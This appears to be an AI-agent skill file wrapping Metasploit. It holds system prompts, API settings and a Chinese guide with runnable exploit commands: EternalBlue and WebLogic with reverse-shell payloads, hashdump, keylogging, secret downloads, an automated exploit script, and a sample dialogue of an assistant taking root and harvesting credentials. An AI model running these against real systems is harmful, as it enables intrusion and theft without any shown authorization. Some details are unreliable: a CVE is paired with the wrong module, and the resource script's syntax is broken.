---
name: metasploit
nameEn: Metasploit Framework
description: 渗透测试框架，支持漏洞利用开发、辅助模块、载荷生成和Meterpreter后渗透
sources:
  product: Metasploit
  homepage: https://www.metasploit.com
  api_doc: https://docs.metasploit.com/api
  github: https://github.com/rapid7/metasploit-framework
  pricing: 社区版免费 | 专业版$2,000/年
  api_type: REST API + CLI

metadata:
  openclaw:
    emoji: "🦈"
    role: PENTEST
    combination: single
    version: "6.4"
    capabilities:
      light: ["漏洞验证", "渗透测试", "安全评估"]
      dark: ["漏洞利用", "后渗透", "权限维持"]
      security: ["渗透测试", "红队演练", "漏洞验证"]
      legal: ["渗透测试授权"]
      technology: ["漏洞利用", "Meterpreter", "Metasploit数据库"]
      business: ["安全评估", "渗透测试服务"]
    mitre_coverage:
      - "TA0001-Initial Access"
      - "TA0002-Execution"
      - "TA0003-Persistence"
      - "TA0004-Privilege Escalation"
      - "TA0008-Lateral Movement"
    scf_coverage:
      - "RA-Risk Assessment"
apis:
  metasploit_api:
    type: metasploit-rest
    baseUrl: "{{msf_url}}:8080"
    auth:
      type: token
      header: "Authorization"
      format: "Bearer {{msf_token}}"
    description: |
      Metasploit提供REST API用于程序化控制框架
    endpoints:
      - name: version
        path: /api/version
        method: GET
        description: 获取Metasploit版本
      - name: getModules
        path: /api/modules/{type}
        method: GET
        description: 获取模块列表
        params:
          - name: type
            type: string
            required: true
            description: "exploit/auxiliary/payload/encoder/post"
      - name: runExploit
        path: /api/modules/exploit/{module}/run
        method: POST
        description: 执行漏洞利用
        body: |
          {
            "DATastore": {
              "RHOSTS": "target",
              "RPORT": 80,
              "TARGETURI": "/"
            }
          }
      - name: getSessions
        path: /api/v1/sessions
        method: GET
        description: 获取活跃会话
      - name: listWorkspaces
        path: /api/v1/workspaces
        method: GET
        description: 列出工作空间
      - name: createHost
        path: /api/v1/hosts
        method: POST
        description: 添加主机到数据库
  msfconsole:
    type: cli
    command: msfconsole
    options:
      - name: -q
        description: 静默模式
      - name: -r
        description: 执行资源脚本
      - name: -x
        description: 执行命令后退出
      - name: --database
        description: 使用数据库
    resource_scripts:
      recon: |
        # 信息收集资源脚本示例
        workspace -a TestProject
        db_nmap -sV 192.168.1.0/24
        hosts
        services
        vulns
      exploit_basic: |
        # 基本漏洞利用脚本
        use exploit/windows/smb/ms17_010_eternalblue
        set RHOSTS 192.168.1.100
        set RPORT 445
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST 192.168.1.50
        set LPORT 4444
        exploit
      web_scan: |
        # Web漏洞扫描脚本
        use auxiliary/scanner/http/http_version
        set RHOSTS 192.168.1.0/24
        set RPORT 80,443,8080
        run
prompts:
  pentest:
    - role: system
      content: |
        你是一个专业的Metasploit渗透测试助手，擅长：
        1. 选择合适的漏洞利用模块
        2. 配置漏洞利用参数
        3. 执行后渗透测试
        4. 生成渗透测试报告
    - role: user
      content: |
        {{action}}：{{target}}
  analyze:
    - role: system
      content: |
        使用Metasploit进行分析时，请：
        1. 选择合适的辅助模块
        2. 进行信息收集和扫描
        3. 发现漏洞后选择对应exploit
        4. 获取会话后进行后渗透
integration:
  install:
    command: |
      # Kali Linux
      # 已预装
      # macOS
      brew install metasploit
      # Docker
      docker run -d --name msf \
        -p 4444:4444 -p 5432:5432 \
        metasploitframework/metasploit-framework
      # 独立安装
      # https://docs.metasploit.com/docs/using-metaploit/starting/quick-start.html
  config:
    - name: msf_database
      label: 数据库配置
      type: string
      default: "postgresql"
      description: "建议使用PostgreSQL数据库存储扫描结果"
    - name: msf_workspace
      label: 默认工作空间
      type: string
      default: "default"
  test:
    command: msfconsole --version
    expect: "Framework"
outputs:
  report:
    format: [text, html, json]
    template: |
      # Metasploit 渗透测试报告
      ## 测试信息
      - 目标: {{target}}
      - 时间: {{date}}
      - 测试人员: {{tester}}
      ## 发现的服务
      {{services}}
      ## 漏洞利用
      | 模块 | 目标 | 结果 |
      |------|------|------|
      {{exploits}}
      ## 获取的会话
      | Session ID | 类型 | 目标 | 用户 |
      |------------|------|------|------|
      {{sessions}}
      ## 敏感数据
      {{sensitive_data}}
      ## 建议
      {{recommendations}}
---
# Metasploit 技能使用指南
## 功能概述
Metasploit是业界最流行的渗透测试框架：
- **漏洞利用**: 超过2000+漏洞利用模块
- **辅助模块**: 信息收集、扫描、指纹识别
- **载荷生成**: 支持多种后门和Shellcode
- **Meterpreter**: 强大的后渗透控制台
- **数据库**: 存储扫描结果和目标信息
- **REST API**: 程序化控制
## 基本命令
### 启动和配置
```bash
# 启动msfconsole
msfconsole
# 带数据库启动
msfdb init
msfconsole --database
# 资源脚本启动
msfconsole -r exploit.rc
# 单命令执行
msfconsole -q -x "version"
```
### 工作空间管理
```bash
# 列出工作空间
workspace -l
# 创建工作空间
workspace -a ProjectName
# 切换工作空间
workspace ProjectName
# 删除工作空间
workspace -d ProjectName
```
### 数据库操作
```bash
# 导入nmap扫描结果
db_import scan.xml
# 直接调用nmap扫描
db_nmap -sV 192.168.1.0/24
# 查看主机
hosts
# 查看服务
services -p 80
# 查看漏洞
vulns
```
## 常用模块
### 信息收集
```bash
# HTTP版本检测
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set RPORT 80
run
# SSH扫描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
# SMB扫描
use auxiliary/scanner/smb/smb_version
run
# MySQL扫描
use auxiliary/scanner/mysql/mysql_version
run
```
### 漏洞利用示例
#### EternalBlue (MS17-010)
```bash
# 选择漏洞利用模块
use exploit/windows/smb/ms17_010_eternalblue
# 设置目标
set RHOSTS 192.168.1.100
set RPORT 445
# 设置载荷
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
# 执行
exploit
```
#### WebLogic漏洞
```bash
use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
set RHOSTS 192.168.1.100
set RPORT 7001
set PAYLOAD cmd/unix/reverse_bash
set LHOST 192.168.1.50
exploit
```
### 后渗透模块
```bash
# 获取系统信息
post/windows/gather/checkvm
# 获取密码哈希
post/windows/gather/hashdump
# 提权
post/windows/escalate/bypassuac
# 键盘记录
post/windows/capture/keylog_recorder
# 横向移动
post/windows/manage/run_as
```
## Meterpreter命令
成功获取Meterpreter会话后：
```bash
# 系统信息
sysinfo
# 当前用户
getuid
# 查看当前目录
pwd
ls
# 上传/下载文件
upload /path/to/file.exe
download C:\\secrets.txt
# 执行命令
execute -f cmd.exe -i
# 打开Shell
shell
# 截图
screenshot
# 键盘记录
keyscan_start
keyscan_dump
# 进程迁移
migrate <pid>
# 端口转发
portfwd add -l 3389 -p 3389 -r 192.168.1.100
```
## REST API使用
Metasploit提供REST API用于程序化控制：
```bash
# 启动API服务 (在msfconsole中)
load msgrpc ServerHost=0.0.0.0 ServerPort=8080 User=msf Pass=abc123
# 或者使用Metasploit RPC
msfrpcd -U msf -P abc123 -p 8080 -S
# 获取Token
curl -X POST http://localhost:8080/api/auth/login \
  -d "username=msf&password=abc123"
# 获取模块列表
curl -H "Authorization: Bearer <token>" \
  http://localhost:8080/api/modules/exploit
# 执行漏洞利用
curl -X POST http://localhost:8080/api/modules/exploit/windows/smb/ms17_010_eternalblue/run \
  -H "Authorization: Bearer <token>" \
  -d '{"RHOSTS":"192.168.1.100"}'
```
## 使用示例
### 智能渗透测试对话
```
用户: 对 192.168.1.100 进行渗透测试
助手:
🦈 **Metasploit 渗透测试**
目标: 192.168.1.100
测试类型: 黑盒渗透
🔍 **第一阶段: 信息收集**
[1] 端口扫描
→ 发现开放端口: 22, 80, 445, 3306, 8080
[2] 服务识别
→ SSH: OpenSSH 7.4
→ HTTP: Apache 2.4.6
→ SMB: Samba 4.6.2
→ MySQL: 5.7.29
→ Tomcat: 9.0.30
🔍 **第二阶段: 漏洞检测**
[+] 检测到SMB服务
→ CVE-2017-7494 (Samba远程代码执行)
→ 状态: 可能 vulnerable
[+] 检测到Apache
→ CVE-2021-41773 (Apache路径穿越)
→ 状态: 需要验证
🔍 **第三阶段: 漏洞利用**
[1] 尝试SMB漏洞
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.168.1.100
→ 失败: 目标系统打了补丁
[2] 尝试Apache路径穿越
use exploit/unix/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.100
set TARGETURI /cgi-bin/test.cgi
→ 成功! 获取Meterpreter会话
🎯 **后渗透**
[+] 获取信息:
→ 系统: Linux 3.10.0-1160.el7.x86_64
→ 用户: root (uid=0)
→ 主机名: victim-server
[+] 发现敏感数据:
→ MySQL root密码: P@ssw0rd123!
→ SSH密钥: /root/.ssh/id_rsa
📊 **测试结果**
状态: ⚠️ 部分成功
获取权限: ✅ 获得root权限
影响数据: 🔴 发现高危凭据
📋 **建议**
1. 立即修补SMB漏洞
2. 更新Apache到最新版本
3. 重置所有发现的凭据
4. 限制MySQL远程访问
```
## 资源脚本示例
### 自动渗透脚本
```ruby
# auto_pentest.rc
# 自动渗透测试资源脚本
<ruby>
# 配置
target_ip = "192.168.1.100"
my_ip = "192.168.1.50"
</ruby>
# 创建工作空间
workspace -a Pentest_<%= target_ip %>
# 端口扫描
print_status("Starting port scan...")
run_single("db_nmap -sS -sV -p 1-10000 --open #{target_ip}")
# 检查开放端口
print_status("Checking for exploitable services...")
# 尝试SMB漏洞
run_single("use exploit/linux/samba/is_known_pipename")
run_single("set RHOSTS #{target_ip}")
run_single("set PAYLOAD cmd/unix/reverse_bash")
run_single("set LHOST #{my_ip}")
run_single("set LPORT 4444")
run_single("exploit -j")
# 检查会话
print_status("Checking sessions...")
run_single("sessions -l")
print_status("Pentest completed!")
</ruby>
# 使用方法:
# msfconsole -r auto_pentest.rc
```